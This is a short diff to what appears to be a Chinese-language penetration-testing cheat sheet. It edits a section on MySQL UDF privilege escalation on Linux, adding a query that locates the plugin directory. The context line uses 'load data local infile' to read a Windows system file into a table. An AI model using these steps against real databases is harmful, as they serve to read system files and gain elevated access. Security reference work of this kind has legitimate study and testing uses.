@@ -998,7 +998,7 @@ load data local infile "C:/Windows/win.ini" into table test FIELDS TERMINATED BY
 ## Mysql udf提权(Linux平台)
 
 ```
-mysql> show variables like '%plugin%';
+mysql> show variables like '%plugin%'; 或 select @@plugin_dir;
 +---------------+-------------------------+
 | Variable_name | Value                   |
 +---------------+-------------------------+
